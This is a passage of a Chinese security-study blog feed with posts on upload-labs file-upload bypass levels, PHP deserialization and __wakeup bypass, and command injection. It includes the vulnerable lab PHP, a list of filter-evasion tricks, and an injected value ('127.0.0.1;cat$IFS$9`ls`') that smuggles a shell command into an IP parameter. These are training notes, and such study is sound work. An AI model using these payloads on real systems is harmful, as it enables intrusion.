<strong>%00:在url中</strong></p><p><strong>0x00:在编程语言中</strong></p></blockquote><blockquote><p>这一关用的是白名单过滤</p><p>​<kbd>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</kbd>​:获取提交的文件名</p><p>​<kbd>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</kbd>​搜寻”.”首次出现的是在第几位，然后我们加1</p><p>​<kbd>substr</kbd>​:获取字符串的子集,这里获取的是”.”后面的</p></blockquote><p>在实际路径直接加1.php%00</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>%00截断</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化攻击</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com"><a href="#魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com" class="headerlink" title="魔法方法php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)"></a>魔法方法<a href="https://www.cnblogs.com/th0r/p/14071894.html#0x02-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95">php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)</a></h2><p>魔法方法指的是在php执行某个过程或函数时会调用的方法</p><p>​<code>__construct()</code>​：在创建对象时候初始化对象，一般用于对变量赋初值（实例化对象时）。</p><p>​<code>__destruct()</code>​： 和构造函数相反，当对象所在函数调用完毕后执行。（对象引用完成或对象被销毁反序列化之后）</p><p>​<code>__toString()</code>​：当对象被当做一个字符串使用时调用。</p><p>​<code>__invoke()</code>​：把对象当成函数调用</p><p>​<code>__clone</code>​：当使用clone关键字拷贝完成一个对象</p><p>​<code>__sleep()</code>​：序列化对象之前就调用此方法(其返回需要一个数组（序列化unserilize（）之前）</p><p>​<code>__wakeup()</code>​：反序列化恢复对象之前调用该方法（反序列化unserilize（）之前）</p><p>​<code>__call()</code>​：当调用对象中不存在的方法会自动调用该方法。  __callStatic():静态调用或调用成员常量时使用的方法不存在</p><p>​<code>__get()</code>​：在调用私有属性（不存在）的时候会自动执行</p><p>​<code>__set()</code>​：给不存在的成员属性赋值</p><p>​<code>__isset()</code>​：在不可访问的属性上调用isset()或empty()触发</p><p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p><h3 id="绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com"><a href="#绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com" class="headerlink" title="绕过 __wakeup​PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)"></a>绕过 <code>__wakeup</code>​<a href="https://xz.aliyun.com/t/14667?time__1311=mqmx9QDtDQ0QD=oDsdoYK0=9bkOQ=DcD3D&alichlgref=https://www.bing.com/">PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)</a></h3><p>当反序列化时, 给出的字段个数的数字小于提供的字段个数, 将不会执行 <code>__wakeup</code>​</p><p>例如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Dino&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;addr&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;209&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Dino&quot;</span>:<span class="hljs-number">114514</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;addr&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;209&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><h2 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p><h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>PHP安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0X00截断</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个是一个POST请求，上一关是GET请求,它的实际路径变到下面去了,要注意一下</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>0X00截断</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pass-20</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/</url>
    
    <content type="html"><![CDATA[<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pass-20</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入漏洞</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是<a href="https://www.cnblogs.com/Hekeats-L/p/16930730.html">命令注入</a></h1><p>‍</p><h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><blockquote><p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）<br>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p></blockquote><p>‍</p><h3 id="命令绕过空格方法有："><a href="#命令绕过空格方法有：" class="headerlink" title="命令绕过空格方法有："></a>命令绕过空格方法有：</h3><blockquote><p>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</p></blockquote><blockquote><p>ps:有时会禁用cat:<br>解决方法是使用tac反向输出命令：<br>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p></blockquote><p>‍</p><p>‍</p><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><blockquote><p>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​</p><p>$IFS在Linux下表示为空格<br>$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</p><p>这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>命令注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pass-15</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/</url>
    
    <content type="html"><![CDATA[<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;  <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于判定其实是上一关是差不多的，所以还是上传一个图片马即可</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pass-15</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache解析漏洞+条件竞争</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache解析漏洞-条件竞争"><a href="#Apache解析漏洞-条件竞争" class="headerlink" title="Apache解析漏洞+条件竞争"></a>Apache解析漏洞+条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;  <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span 